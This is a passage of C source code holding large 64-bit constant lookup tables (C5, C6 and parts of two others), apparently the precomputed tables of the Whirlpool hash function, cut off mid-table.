    LL(0xa8412abd15155415), LL(0x9fb6eee87777c177), LL(0xa5eb6e923737dc37), LL(0x7b56d79ee5e5b3e5),
    LL(0x8cd923139f9f469f), LL(0xd317fd23f0f0e7f0), LL(0x6a7f94204a4a354a), LL(0x9e95a944dada4fda),
    LL(0xfa25b0a258587d58), LL(0x06ca8fcfc9c903c9), LL(0x558d527c2929a429), LL(0x5022145a0a0a280a),
    LL(0xe14f7f50b1b1feb1), LL(0x691a5dc9a0a0baa0), LL(0x7fdad6146b6bb16b), LL(0x5cab17d985852e85),
    LL(0x8173673cbdbdcebd), LL(0xd234ba8f5d5d695d), LL(0x8050209010104010), LL(0xf303f507f4f4f7f4),
    LL(0x16c08bddcbcb0bcb), LL(0xedc67cd33e3ef83e), LL(0x28110a2d05051405), LL(0x1fe6ce7867678167),
    LL(0x7353d597e4e4b7e4), LL(0x25bb4e0227279c27), LL(0x3258827341411941), LL(0x2c9d0ba78b8b168b),
    LL(0x510153f6a7a7a6a7), LL(0xcf94fab27d7de97d), LL(0xdcfb374995956e95), LL(0x8e9fad56d8d847d8),
    LL(0x8b30eb70fbfbcbfb), LL(0x2371c1cdeeee9fee), LL(0xc791f8bb7c7ced7c), LL(0x17e3cc7166668566),
    LL(0xa68ea77bdddd53dd), LL(0xb84b2eaf17175c17), LL(0x02468e4547470147), LL(0x84dc211a9e9e429e),
    LL(0x1ec589d4caca0fca), LL(0x75995a582d2db42d), LL(0x9179632ebfbfc6bf), LL(0x381b0e3f07071c07),
    LL(0x012347acadad8ead), LL(0xea2fb4b05a5a755a), LL(0x6cb51bef83833683), LL(0x85ff66b63333cc33),
    LL(0x3ff2c65c63639163), LL(0x100a041202020802), LL(0x39384993aaaa92aa), LL(0xafa8e2de7171d971),
    LL(0x0ecf8dc6c8c807c8), LL(0xc87d32d119196419), LL(0x7270923b49493949), LL(0x869aaf5fd9d943d9),
    LL(0xc31df931f2f2eff2), LL(0x4b48dba8e3e3abe3), LL(0xe22ab6b95b5b715b), LL(0x34920dbc88881a88),
    LL(0xa4c8293e9a9a529a), LL(0x2dbe4c0b26269826), LL(0x8dfa64bf3232c832), LL(0xe94a7d59b0b0fab0),
    LL(0x1b6acff2e9e983e9), LL(0x78331e770f0f3c0f), LL(0xe6a6b733d5d573d5), LL(0x74ba1df480803a80),
    LL(0x997c6127bebec2be), LL(0x26de87ebcdcd13cd), LL(0xbde468893434d034), LL(0x7a75903248483d48),
    LL(0xab24e354ffffdbff), LL(0xf78ff48d7a7af57a), LL(0xf4ea3d6490907a90), LL(0xc23ebe9d5f5f615f),
    LL(0x1da0403d20208020), LL(0x67d5d00f6868bd68), LL(0xd07234ca1a1a681a), LL(0x192c41b7aeae82ae),
    LL(0xc95e757db4b4eab4), LL(0x9a19a8ce54544d54), LL(0xece53b7f93937693), LL(0x0daa442f22228822),
    LL(0x07e9c86364648d64), LL(0xdb12ff2af1f1e3f1), LL(0xbfa2e6cc7373d173), LL(0x905a248212124812),
    LL(0x3a5d807a40401d40), LL(0x4028104808082008), LL(0x56e89b95c3c32bc3), LL(0x337bc5dfecec97ec),
    LL(0x9690ab4ddbdb4bdb), LL(0x611f5fc0a1a1bea1), LL(0x1c8307918d8d0e8d), LL(0xf5c97ac83d3df43d),
    LL(0xccf1335b97976697), LL(0x0000000000000000), LL(0x36d483f9cfcf1bcf), LL(0x4587566e2b2bac2b),
    LL(0x97b3ece17676c576), LL(0x64b019e682823282), LL(0xfea9b128d6d67fd6), LL(0xd87736c31b1b6c1b),
    LL(0xc15b7774b5b5eeb5), LL(0x112943beafaf86af), LL(0x77dfd41d6a6ab56a), LL(0xba0da0ea50505d50),
    LL(0x124c8a5745450945), LL(0xcb18fb38f3f3ebf3), LL(0x9df060ad3030c030), LL(0x2b74c3c4efef9bef),
    LL(0xe5c37eda3f3ffc3f), LL(0x921caac755554955), LL(0x791059dba2a2b2a2), LL(0x0365c9e9eaea8fea),
    LL(0x0fecca6a65658965), LL(0xb9686903babad2ba), LL(0x65935e4a2f2fbc2f), LL(0x4ee79d8ec0c027c0),
    LL(0xbe81a160dede5fde), LL(0xe06c38fc1c1c701c), LL(0xbb2ee746fdfdd3fd), LL(0x52649a1f4d4d294d),
    LL(0xe4e0397692927292), LL(0x8fbceafa7575c975), LL(0x301e0c3606061806), LL(0x249809ae8a8a128a),
    LL(0xf940794bb2b2f2b2), LL(0x6359d185e6e6bfe6), LL(0x70361c7e0e0e380e), LL(0xf8633ee71f1f7c1f),
    LL(0x37f7c45562629562), LL(0xeea3b53ad4d477d4), LL(0x29324d81a8a89aa8), LL(0xc4f4315296966296),
    LL(0x9b3aef62f9f9c3f9), LL(0x66f697a3c5c533c5), LL(0x35b14a1025259425), LL(0xf220b2ab59597959),
    LL(0x54ae15d084842a84), LL(0xb7a7e4c57272d572), LL(0xd5dd72ec3939e439), LL(0x5a6198164c4c2d4c),
    LL(0xca3bbc945e5e655e), LL(0xe785f09f7878fd78), LL(0xddd870e53838e038), LL(0x148605988c8c0a8c),
    LL(0xc6b2bf17d1d163d1), LL(0x410b57e4a5a5aea5), LL(0x434dd9a1e2e2afe2), LL(0x2ff8c24e61619961),
    LL(0xf1457b42b3b3f6b3), LL(0x15a5423421218421), LL(0x94d625089c9c4a9c), LL(0xf0663cee1e1e781e),
    LL(0x2252866143431143), LL(0x76fc93b1c7c73bc7), LL(0xb32be54ffcfcd7fc), LL(0x2014082404041004),
    LL(0xb208a2e351515951), LL(0xbcc72f2599995e99), LL(0x4fc4da226d6da96d), LL(0x68391a650d0d340d),
    LL(0x8335e979fafacffa), LL(0xb684a369dfdf5bdf), LL(0xd79bfca97e7ee57e), LL(0x3db4481924249024),
    LL(0xc5d776fe3b3bec3b), LL(0x313d4b9aabab96ab), LL(0x3ed181f0cece1fce), LL(0x8855229911114411),
    LL(0x0c8903838f8f068f), LL(0x4a6b9c044e4e254e), LL(0xd1517366b7b7e6b7), LL(0x0b60cbe0ebeb8beb),
    LL(0xfdcc78c13c3cf03c), LL(0x7cbf1ffd81813e81), LL(0xd4fe354094946a94), LL(0xeb0cf31cf7f7fbf7),
    LL(0xa1676f18b9b9deb9), LL(0x985f268b13134c13), LL(0x7d9c58512c2cb02c), LL(0xd6b8bb05d3d36bd3),
    LL(0x6b5cd38ce7e7bbe7), LL(0x57cbdc396e6ea56e), LL(0x6ef395aac4c437c4), LL(0x180f061b03030c03),
    LL(0x8a13acdc56564556), LL(0x1a49885e44440d44), LL(0xdf9efea07f7fe17f), LL(0x21374f88a9a99ea9),
    LL(0x4d8254672a2aa82a), LL(0xb16d6b0abbbbd6bb), LL(0x46e29f87c1c123c1), LL(0xa202a6f153535153),
    LL(0xae8ba572dcdc57dc), LL(0x582716530b0b2c0b), LL(0x9cd327019d9d4e9d), LL(0x47c1d82b6c6cad6c),
    LL(0x95f562a43131c431), LL(0x87b9e8f37474cd74), LL(0xe309f115f6f6fff6), LL(0x0a438c4c46460546),
    LL(0x092645a5acac8aac), LL(0x3c970fb589891e89), LL(0xa04428b414145014), LL(0x5b42dfbae1e1a3e1),
    LL(0xb04e2ca616165816), LL(0xcdd274f73a3ae83a), LL(0x6fd0d2066969b969), LL(0x482d124109092409),
    LL(0xa7ade0d77070dd70), LL(0xd954716fb6b6e2b6), LL(0xceb7bd1ed0d067d0), LL(0x3b7ec7d6eded93ed),
    LL(0x2edb85e2cccc17cc), LL(0x2a57846842421542), LL(0xb4c22d2c98985a98), LL(0x490e55eda4a4aaa4),
    LL(0x5d8850752828a028), LL(0xda31b8865c5c6d5c), LL(0x933fed6bf8f8c7f8), LL(0x44a411c286862286),
};

static const u64 C5[256] = {
    LL(0x18c07830d8181860), LL(0x2305af462623238c), LL(0xc67ef991b8c6c63f), LL(0xe8136fcdfbe8e887),
    LL(0x874ca113cb878726), LL(0xb8a9626d11b8b8da), LL(0x0108050209010104), LL(0x4f426e9e0d4f4f21),
    LL(0x36adee6c9b3636d8), LL(0xa6590451ffa6a6a2), LL(0xd2debdb90cd2d26f), LL(0xf5fb06f70ef5f5f3),
    LL(0x79ef80f2967979f9), LL(0x6f5fcede306f6fa1), LL(0x91fcef3f6d91917e), LL(0x52aa07a4f8525255),
    LL(0x6027fdc04760609d), LL(0xbc89766535bcbcca), LL(0x9baccd2b379b9b56), LL(0x8e048c018a8e8e02),
    LL(0xa371155bd2a3a3b6), LL(0x0c603c186c0c0c30), LL(0x7bff8af6847b7bf1), LL(0x35b5e16a803535d4),
    LL(0x1de8693af51d1d74), LL(0xe05347ddb3e0e0a7), LL(0xd7f6acb321d7d77b), LL(0xc25eed999cc2c22f),
    LL(0x2e6d965c432e2eb8), LL(0x4b627a96294b4b31), LL(0xfea321e15dfefedf), LL(0x578216aed5575741),
    LL(0x15a8412abd151554), LL(0x779fb6eee87777c1), LL(0x37a5eb6e923737dc), LL(0xe57b56d79ee5e5b3),
    LL(0x9f8cd923139f9f46), LL(0xf0d317fd23f0f0e7), LL(0x4a6a7f94204a4a35), LL(0xda9e95a944dada4f),
    LL(0x58fa25b0a258587d), LL(0xc906ca8fcfc9c903), LL(0x29558d527c2929a4), LL(0x0a5022145a0a0a28),
    LL(0xb1e14f7f50b1b1fe), LL(0xa0691a5dc9a0a0ba), LL(0x6b7fdad6146b6bb1), LL(0x855cab17d985852e),
    LL(0xbd8173673cbdbdce), LL(0x5dd234ba8f5d5d69), LL(0x1080502090101040), LL(0xf4f303f507f4f4f7),
    LL(0xcb16c08bddcbcb0b), LL(0x3eedc67cd33e3ef8), LL(0x0528110a2d050514), LL(0x671fe6ce78676781),
    LL(0xe47353d597e4e4b7), LL(0x2725bb4e0227279c), LL(0x4132588273414119), LL(0x8b2c9d0ba78b8b16),
    LL(0xa7510153f6a7a7a6), LL(0x7dcf94fab27d7de9), LL(0x95dcfb374995956e), LL(0xd88e9fad56d8d847),
    LL(0xfb8b30eb70fbfbcb), LL(0xee2371c1cdeeee9f), LL(0x7cc791f8bb7c7ced), LL(0x6617e3cc71666685),
    LL(0xdda68ea77bdddd53), LL(0x17b84b2eaf17175c), LL(0x4702468e45474701), LL(0x9e84dc211a9e9e42),
    LL(0xca1ec589d4caca0f), LL(0x2d75995a582d2db4), LL(0xbf9179632ebfbfc6), LL(0x07381b0e3f07071c),
    LL(0xad012347acadad8e), LL(0x5aea2fb4b05a5a75), LL(0x836cb51bef838336), LL(0x3385ff66b63333cc),
    LL(0x633ff2c65c636391), LL(0x02100a0412020208), LL(0xaa39384993aaaa92), LL(0x71afa8e2de7171d9),
    LL(0xc80ecf8dc6c8c807), LL(0x19c87d32d1191964), LL(0x497270923b494939), LL(0xd9869aaf5fd9d943),
    LL(0xf2c31df931f2f2ef), LL(0xe34b48dba8e3e3ab), LL(0x5be22ab6b95b5b71), LL(0x8834920dbc88881a),
    LL(0x9aa4c8293e9a9a52), LL(0x262dbe4c0b262698), LL(0x328dfa64bf3232c8), LL(0xb0e94a7d59b0b0fa),
    LL(0xe91b6acff2e9e983), LL(0x0f78331e770f0f3c), LL(0xd5e6a6b733d5d573), LL(0x8074ba1df480803a),
    LL(0xbe997c6127bebec2), LL(0xcd26de87ebcdcd13), LL(0x34bde468893434d0), LL(0x487a75903248483d),
    LL(0xffab24e354ffffdb), LL(0x7af78ff48d7a7af5), LL(0x90f4ea3d6490907a), LL(0x5fc23ebe9d5f5f61),
    LL(0x201da0403d202080), LL(0x6867d5d00f6868bd), LL(0x1ad07234ca1a1a68), LL(0xae192c41b7aeae82),
    LL(0xb4c95e757db4b4ea), LL(0x549a19a8ce54544d), LL(0x93ece53b7f939376), LL(0x220daa442f222288),
    LL(0x6407e9c86364648d), LL(0xf1db12ff2af1f1e3), LL(0x73bfa2e6cc7373d1), LL(0x12905a2482121248),
    LL(0x403a5d807a40401d), LL(0x0840281048080820), LL(0xc356e89b95c3c32b), LL(0xec337bc5dfecec97),
    LL(0xdb9690ab4ddbdb4b), LL(0xa1611f5fc0a1a1be), LL(0x8d1c8307918d8d0e), LL(0x3df5c97ac83d3df4),
    LL(0x97ccf1335b979766), LL(0x0000000000000000), LL(0xcf36d483f9cfcf1b), LL(0x2b4587566e2b2bac),
    LL(0x7697b3ece17676c5), LL(0x8264b019e6828232), LL(0xd6fea9b128d6d67f), LL(0x1bd87736c31b1b6c),
    LL(0xb5c15b7774b5b5ee), LL(0xaf112943beafaf86), LL(0x6a77dfd41d6a6ab5), LL(0x50ba0da0ea50505d),
    LL(0x45124c8a57454509), LL(0xf3cb18fb38f3f3eb), LL(0x309df060ad3030c0), LL(0xef2b74c3c4efef9b),
    LL(0x3fe5c37eda3f3ffc), LL(0x55921caac7555549), LL(0xa2791059dba2a2b2), LL(0xea0365c9e9eaea8f),
    LL(0x650fecca6a656589), LL(0xbab9686903babad2), LL(0x2f65935e4a2f2fbc), LL(0xc04ee79d8ec0c027),
    LL(0xdebe81a160dede5f), LL(0x1ce06c38fc1c1c70), LL(0xfdbb2ee746fdfdd3), LL(0x4d52649a1f4d4d29),
    LL(0x92e4e03976929272), LL(0x758fbceafa7575c9), LL(0x06301e0c36060618), LL(0x8a249809ae8a8a12),
    LL(0xb2f940794bb2b2f2), LL(0xe66359d185e6e6bf), LL(0x0e70361c7e0e0e38), LL(0x1ff8633ee71f1f7c),
    LL(0x6237f7c455626295), LL(0xd4eea3b53ad4d477), LL(0xa829324d81a8a89a), LL(0x96c4f43152969662),
    LL(0xf99b3aef62f9f9c3), LL(0xc566f697a3c5c533), LL(0x2535b14a10252594), LL(0x59f220b2ab595979),
    LL(0x8454ae15d084842a), LL(0x72b7a7e4c57272d5), LL(0x39d5dd72ec3939e4), LL(0x4c5a6198164c4c2d),
    LL(0x5eca3bbc945e5e65), LL(0x78e785f09f7878fd), LL(0x38ddd870e53838e0), LL(0x8c148605988c8c0a),
    LL(0xd1c6b2bf17d1d163), LL(0xa5410b57e4a5a5ae), LL(0xe2434dd9a1e2e2af), LL(0x612ff8c24e616199),
    LL(0xb3f1457b42b3b3f6), LL(0x2115a54234212184), LL(0x9c94d625089c9c4a), LL(0x1ef0663cee1e1e78),
    LL(0x4322528661434311), LL(0xc776fc93b1c7c73b), LL(0xfcb32be54ffcfcd7), LL(0x0420140824040410),
    LL(0x51b208a2e3515159), LL(0x99bcc72f2599995e), LL(0x6d4fc4da226d6da9), LL(0x0d68391a650d0d34),
    LL(0xfa8335e979fafacf), LL(0xdfb684a369dfdf5b), LL(0x7ed79bfca97e7ee5), LL(0x243db44819242490),
    LL(0x3bc5d776fe3b3bec), LL(0xab313d4b9aabab96), LL(0xce3ed181f0cece1f), LL(0x1188552299111144),
    LL(0x8f0c8903838f8f06), LL(0x4e4a6b9c044e4e25), LL(0xb7d1517366b7b7e6), LL(0xeb0b60cbe0ebeb8b),
    LL(0x3cfdcc78c13c3cf0), LL(0x817cbf1ffd81813e), LL(0x94d4fe354094946a), LL(0xf7eb0cf31cf7f7fb),
    LL(0xb9a1676f18b9b9de), LL(0x13985f268b13134c), LL(0x2c7d9c58512c2cb0), LL(0xd3d6b8bb05d3d36b),
    LL(0xe76b5cd38ce7e7bb), LL(0x6e57cbdc396e6ea5), LL(0xc46ef395aac4c437), LL(0x03180f061b03030c),
    LL(0x568a13acdc565645), LL(0x441a49885e44440d), LL(0x7fdf9efea07f7fe1), LL(0xa921374f88a9a99e),
    LL(0x2a4d8254672a2aa8), LL(0xbbb16d6b0abbbbd6), LL(0xc146e29f87c1c123), LL(0x53a202a6f1535351),
    LL(0xdcae8ba572dcdc57), LL(0x0b582716530b0b2c), LL(0x9d9cd327019d9d4e), LL(0x6c47c1d82b6c6cad),
    LL(0x3195f562a43131c4), LL(0x7487b9e8f37474cd), LL(0xf6e309f115f6f6ff), LL(0x460a438c4c464605),
    LL(0xac092645a5acac8a), LL(0x893c970fb589891e), LL(0x14a04428b4141450), LL(0xe15b42dfbae1e1a3),
    LL(0x16b04e2ca6161658), LL(0x3acdd274f73a3ae8), LL(0x696fd0d2066969b9), LL(0x09482d1241090924),
    LL(0x70a7ade0d77070dd), LL(0xb6d954716fb6b6e2), LL(0xd0ceb7bd1ed0d067), LL(0xed3b7ec7d6eded93),
    LL(0xcc2edb85e2cccc17), LL(0x422a578468424215), LL(0x98b4c22d2c98985a), LL(0xa4490e55eda4a4aa),
    LL(0x285d8850752828a0), LL(0x5cda31b8865c5c6d), LL(0xf8933fed6bf8f8c7), LL(0x8644a411c2868622),
};

static const u64 C6[256] = {
    LL(0x6018c07830d81818), LL(0x8c2305af46262323), LL(0x3fc67ef991b8c6c6), LL(0x87e8136fcdfbe8e8),
    LL(0x26874ca113cb8787), LL(0xdab8a9626d11b8b8), LL(0x0401080502090101), LL(0x214f426e9e0d4f4f),
    LL(0xd836adee6c9b3636), LL(0xa2a6590451ffa6a6), LL(0x6fd2debdb90cd2d2), LL(0xf3f5fb06f70ef5f5),
    LL(0xf979ef80f2967979), LL(0xa16f5fcede306f6f), LL(0x7e91fcef3f6d9191), LL(0x5552aa07a4f85252),
    LL(0x9d6027fdc0476060), LL(0xcabc89766535bcbc), LL(0x569baccd2b379b9b), LL(0x028e048c018a8e8e),
    LL(0xb6a371155bd2a3a3), LL(0x300c603c186c0c0c), LL(0xf17bff8af6847b7b), LL(0xd435b5e16a803535),
    LL(0x741de8693af51d1d), LL(0xa7e05347ddb3e0e0), LL(0x7bd7f6acb321d7d7), LL(0x2fc25eed999cc2c2),
    LL(0xb82e6d965c432e2e), LL(0x314b627a96294b4b), LL(0xdffea321e15dfefe), LL(0x41578216aed55757),
    LL(0x5415a8412abd1515), LL(0xc1779fb6eee87777), LL(0xdc37a5eb6e923737), LL(0xb3e57b56d79ee5e5),
    LL(0x469f8cd923139f9f), LL(0xe7f0d317fd23f0f0), LL(0x354a6a7f94204a4a), LL(0x4fda9e95a944dada),
    LL(0x7d58fa25b0a25858), LL(0x03c906ca8fcfc9c9), LL(0xa429558d527c2929), LL(0x280a5022145a0a0a),
    LL(0xfeb1e14f7f50b1b1), LL(0xbaa0691a5dc9a0a0), LL(0xb16b7fdad6146b6b), LL(0x2e855cab17d98585),
    LL(0xcebd8173673cbdbd), LL(0x695dd234ba8f5d5d), LL(0x4010805020901010), LL(0xf7f4f303f507f4f4),
    LL(0x0bcb16c08bddcbcb), LL(0xf83eedc67cd33e3e), LL(0x140528110a2d0505), LL(0x81671fe6ce786767),
    LL(0xb7e47353d597e4e4), LL(0x9c2725bb4e022727), LL(0x1941325882734141), LL(0x168b2c9d0ba78b8b),
    LL(0xa6a7510153f6a7a7), LL(0xe97dcf94fab27d7d), LL(0x6e95dcfb37499595), LL(0x47d88e9fad56d8d8),
    LL(0xcbfb8b30eb70fbfb), LL(0x9fee2371c1cdeeee), LL(0xed7cc791f8bb7c7c), LL(0x856617e3cc716666),
    LL(0x53dda68ea77bdddd), LL(0x5c17b84b2eaf1717), LL(0x014702468e454747), LL(0x429e84dc211a9e9e),
    LL(0x0fca1ec589d4caca), LL(0xb42d75995a582d2d), LL(0xc6bf9179632ebfbf), LL(0x1c07381b0e3f0707),
    LL(0x8ead012347acadad), LL(0x755aea2fb4b05a5a), LL(0x36836cb51bef8383), LL(0xcc3385ff66b63333),
    LL(0x91633ff2c65c6363), LL(0x0802100a04120202), LL(0x92aa39384993aaaa), LL(0xd971afa8e2de7171),
    LL(0x07c80ecf8dc6c8c8), LL(0x6419c87d32d11919), LL(0x39497270923b4949), LL(0x43d9869aaf5fd9d9),
    LL(0xeff2c31df931f2f2), LL(0xabe34b48dba8e3e3), LL(0x715be22ab6b95b5b), LL(0x1a8834920dbc8888),
    LL(0x529aa4c8293e9a9a), LL(0x98262dbe4c0b2626), LL(0xc8328dfa64bf3232), LL(0xfab0e94a7d59b0b0),
    LL(0x83e91b6acff2e9e9), LL(0x3c0f78331e770f0f), LL(0x73d5e6a6b733d5d5), LL(0x3a8074ba1df48080),
    LL(0xc2be997c6127bebe), LL(0x13cd26de87ebcdcd), LL(0xd034bde468893434), LL(0x3d487a7590324848),
    LL(0xdbffab24e354ffff), LL(0xf57af78ff48d7a7a), LL(0x7a90f4ea3d649090), LL(0x615fc23ebe9d5f5f),
    LL(0x80201da0403d2020), LL(0xbd6867d5d00f6868), LL(0x681ad07234ca1a1a), LL(0x82ae192c41b7aeae),
    LL(0xeab4c95e757db4b4), LL(0x4d549a19a8ce5454), LL(0x7693ece53b7f9393), LL(0x88220daa442f2222),
    LL(0x8d6407e9c8636464), LL(0xe3f1db12ff2af1f1), LL(0xd173bfa2e6cc7373), LL(0x4812905a24821212),
    LL(0x1d403a5d807a4040), LL(0x2008402810480808), LL(0x2bc356e89b95c3c3), LL(0x97ec337bc5dfecec),
    LL(0x4bdb9690ab4ddbdb), LL(0xbea1611f5fc0a1a1), LL(0x0e8d1c8307918d8d), LL(0xf43df5c97ac83d3d),
    LL(0x6697ccf1335b9797), LL(0x0000000000000000), LL(0x1bcf36d483f9cfcf), LL(0xac2b4587566e2b2b),
    LL(0xc57697b3ece17676), LL(0x328264b019e68282), LL(0x7fd6fea9b128d6d6), LL(0x6c1bd87736c31b1b),
    LL(0xeeb5c15b7774b5b5), LL(0x86af112943beafaf), LL(0xb56a77dfd41d6a6a), LL(0x5d50ba0da0ea5050),
    LL(0x0945124c8a574545), LL(0xebf3cb18fb38f3f3), LL(0xc0309df060ad3030), LL(0x9bef2b74c3c4efef),
    LL(0xfc3fe5c37eda3f3f), LL(0x4955921caac75555), LL(0xb2a2791059dba2a2), LL(0x8fea0365c9e9eaea),
    LL(0x89650fecca6a6565), LL(0xd2bab9686903baba), LL(0xbc2f65935e4a2f2f), LL(0x27c04ee79d8ec0c0),
    LL(0x5fdebe81a160dede), LL(0x701ce06c38fc1c1c), LL(0xd3fdbb2ee746fdfd), LL(0x294d52649a1f4d4d),
    LL(0x7292e4e039769292), LL(0xc9758fbceafa7575), LL(0x1806301e0c360606), LL(0x128a249809ae8a8a),
    LL(0xf2b2f940794bb2b2), LL(0xbfe66359d185e6e6), LL(0x380e70361c7e0e0e), LL(0x7c1ff8633ee71f1f),
    LL(0x956237f7c4556262), LL(0x77d4eea3b53ad4d4), LL(0x9aa829324d81a8a8), LL(0x6296c4f431529696),
    LL(0xc3f99b3aef62f9f9), LL(0x33c566f697a3c5c5), LL(0x942535b14a102525), LL(0x7959f220b2ab5959),
    LL(0x2a8454ae15d08484), LL(0xd572b7a7e4c57272), LL(0xe439d5dd72ec3939), LL(0x2d4c5a6198164c4c),
    LL(0x655eca3bbc945e5e), LL(0xfd78e785f09f7878), LL(0xe038ddd870e53838), LL(0x0a8c148605988c8c),
    LL(0x63d1c6b2bf17d1d1), LL(0xaea5410b57e4a5a5), LL(0xafe2434dd9a1e2e2), LL(0x99612ff8c24e6161),
    LL(0xf6b3f1457b42b3b3), LL(0x842115a542342121), LL(0x4a9c94d625089c9c), LL(0x781ef0663cee1e1e),
    LL(0x1143225286614343), LL(0x3bc776fc93b1c7c7), LL(0xd7fcb32be54ffcfc), LL(0x1004201408240404),
    LL(0x5951b208a2e35151), LL(0x5e99bcc72f259999), LL(0xa96d4fc4da226d6d), LL(0x340d68391a650d0d),
    LL(0xcffa8335e979fafa), LL(0x5bdfb684a369dfdf), LL(0xe57ed79bfca97e7e), LL(0x90243db448192424),
    LL(0xec3bc5d776fe3b3b), LL(0x96ab313d4b9aabab), LL(0x1fce3ed181f0cece), LL(0x4411885522991111),
    LL(0x068f0c8903838f8f), LL(0x254e4a6b9c044e4e), LL(0xe6b7d1517366b7b7), LL(0x8beb0b60cbe0ebeb),
    LL(0xf03cfdcc78c13c3c), LL(0x3e817cbf1ffd8181), LL(0x6a94d4fe35409494), LL(0xfbf7eb0cf31cf7f7),
    LL(0xdeb9a1676f18b9b9), LL(0x4c13985f268b1313), LL(0xb02c7d9c58512c2c), LL(0x6bd3d6b8bb05d3d3),
    LL(0xbbe76b5cd38ce7e7), LL(0xa56e57cbdc396e6e), LL(0x37c46ef395aac4c4), LL(0x0c03180f061b0303),
    LL(0x45568a13acdc5656), LL(0x0d441a49885e4444), LL(0xe17fdf9efea07f7f), LL(0x9ea921374f88a9a9),
    LL(0xa82a4d8254672a2a), LL(0xd6bbb16d6b0abbbb), LL(0x23c146e29f87c1c1), LL(0x5153a202a6f15353),
    LL(0x57dcae8ba572dcdc), LL(0x2c0b582716530b0b), LL(0x4e9d9cd327019d9d), LL(0xad6c47c1d82b6c6c),
    LL(0xc43195f562a43131), LL(0xcd7487b9e8f37474), LL(0xfff6e309f115f6f6), LL(0x05460a438c4c4646),
    LL(0x8aac092645a5acac), LL(0x1e893c970fb58989), LL(0x5014a04428b41414), LL(0xa3e15b42dfbae1e1),
    LL(0x5816b04e2ca61616), LL(0xe83acdd274f73a3a), LL(0xb9696fd0d2066969), LL(0x2409482d12410909),
    LL(0xdd70a7ade0d77070), LL(0xe2b6d954716fb6b6), LL(0x67d0ceb7bd1ed0d0), LL(0x93ed3b7ec7d6eded),
    LL(0x17cc2edb85e2cccc), LL(0x15422a5784684242), LL(0x5a98b4c22d2c9898), LL(0xaaa4490e55eda4a4),
    LL(0xa0285d8850752828), LL(0x6d5cda31b8865c5c), LL(0xc7f8933fed6bf8f8), LL(0x228644a411c28686),
};

static const u64 C7[256] = {
    LL(0x186018c07830d818), LL(0x238c2305af462623), LL(0xc63fc67ef991b8c6), LL(0xe887e8136fcdfbe8),
    LL(0x8726874ca113cb87), LL(0xb8dab8a9626d11b8), LL(0x0104010805020901), LL(0x4f214f426e9e0d4f),
    LL(0x36d836adee6c9b36), LL(0xa6a2a6590451ffa6), LL(0xd26fd2debdb90cd2), LL(0xf5f3f5fb06f70ef5),
    LL(0x79f979ef80f29679), LL(0x6fa16f5fcede306f), LL(0x917e91fcef3f6d91), LL(0x525552aa07a4f852),
    LL(0x609d6027fdc04760), LL(0xbccabc89766535bc), LL(0x9b569baccd2b379b), LL(0x8e028e048c018a8e),
    LL(0xa3b6a371155bd2a3), LL(0x0c300c603c186c0c), LL(0x7bf17bff8af6847b), LL(0x35d435b5e16a8035),
    LL(0x1d741de8693af51d), LL(0xe0a7e05347ddb3e0), LL(0xd77bd7f6acb321d7), LL(0xc22fc25eed999cc2),
    LL(0x2eb82e6d965c432e), LL(0x4b314b627a96294b), LL(0xfedffea321e15dfe), LL(0x5741578216aed557),
    LL(0x155415a8412abd15), LL(0x77c1779fb6eee877), LL(0x37dc37a5eb6e9237), LL(0xe5b3e57b56d79ee5),
    LL(0x9f469f8cd923139f), LL(0xf0e7f0d317fd23f0), LL(0x4a354a6a7f94204a), LL(0xda4fda9e95a944da),
    LL(0x587d58fa25b0a258), LL(0xc903c906ca8fcfc9), LL(0x29a429558d527c29), LL(0x0a280a5022145a0a),
    LL(0xb1feb1e14f7f50b1), LL(0xa0baa0691a5dc9a0), LL(0x6bb16b7fdad6146b), LL(0x852e855cab17d985),
    LL(0xbdcebd8173673cbd), LL(0x5d695dd234ba8f5d), LL(0x1040108050209010), LL(0xf4f7f4f303f507f4),
    LL(0xcb0bcb16c08bddcb), LL(0x3ef83eedc67cd33e), LL(0x05140528110a2d05), LL(0x6781671fe6ce7867),
    LL(0xe4b7e47353d597e4), LL(0x279c2725bb4e0227), LL(0x4119413258827341), LL(0x8b168b2c9d0ba78b),
    LL(0xa7a6a7510153f6a7), LL(0x7de97dcf94fab27d), LL(0x956e95dcfb374995), LL(0xd847d88e9fad56d8),
    LL(0xfbcbfb8b30eb70fb), LL(0xee9fee2371c1cdee), LL(0x7ced7cc791f8bb7c), LL(0x66856617e3cc7166),
    LL(0xdd53dda68ea77bdd), LL(0x175c17b84b2eaf17), LL(0x47014702468e4547), LL(0x9e429e84dc211a9e),
    LL(0xca0fca1ec589d4ca), LL(0x2db42d75995a582d), LL(0xbfc6bf9179632ebf), LL(0x071c07381b0e3f07),
    LL(0xad8ead012347acad), LL(0x5a755aea2fb4b05a), LL(0x8336836cb51bef83), LL(0x33cc3385ff66b633),
    LL(0x6391633ff2c65c63), LL(0x020802100a041202), LL(0xaa92aa39384993aa), LL(0x71d971afa8e2de71),
    LL(0xc807c80ecf8dc6c8), LL(0x196419c87d32d119), LL(0x4939497270923b49), LL(0xd943d9869aaf5fd9),
    LL(0xf2eff2c31df931f2), LL(0xe3abe34b48dba8e3), LL(0x5b715be22ab6b95b), LL(0x881a8834920dbc88),
    LL(0x9a529aa4c8293e9a), LL(0x2698262dbe4c0b26), LL(0x32c8328dfa64bf32), LL(0xb0fab0e94a7d59b0),
    LL(0xe983e91b6acff2e9), LL(0x0f3c0f78331e770f), LL(0xd573d5e6a6b733d5), LL(0x803a8074ba1df480),
    LL(0xbec2be997c6127be), LL(0xcd13cd26de87ebcd), LL(0x34d034bde4688934), LL(0x483d487a75903248),
    LL(0xffdbffab24e354ff), LL(0x7af57af78ff48d7a), LL(0x907a90f4ea3d6490), LL(0x5f615fc23ebe9d5f),
    LL(0x2080201da0403d20), LL(0x68bd6867d5d00f68), LL(0x1a681ad07234ca1a), LL(0xae82ae192c41b7ae),
    LL(0xb4eab4c95e757db4), LL(0x544d549a19a8ce54), LL(0x937693ece53b7f93), LL(0x2288220daa442f22),
    LL(0x648d6407e9c86364), LL(0xf1e3f1db12ff2af1), LL(0x73d173bfa2e6cc73), LL(0x124812905a248212),
    LL(0x401d403a5d807a40), LL(0x0820084028104808), LL(0xc32bc356e89b95c3), LL(0xec97ec337bc5dfec),
    LL(0xdb4bdb9690ab4ddb), LL(0xa1bea1611f5fc0a1), LL(0x8d0e8d1c8307918d), LL(0x3df43df5c97ac83d),
    LL(0x976697ccf1335b97), LL(0x0000000000000000), LL(0xcf1bcf36d483f9cf), LL(0x2bac2b4587566e2b),
    LL(0x76c57697b3ece176), LL(0x82328264b019e682), LL(0xd67fd6fea9b128d6), LL(0x1b6c1bd87736c31b),
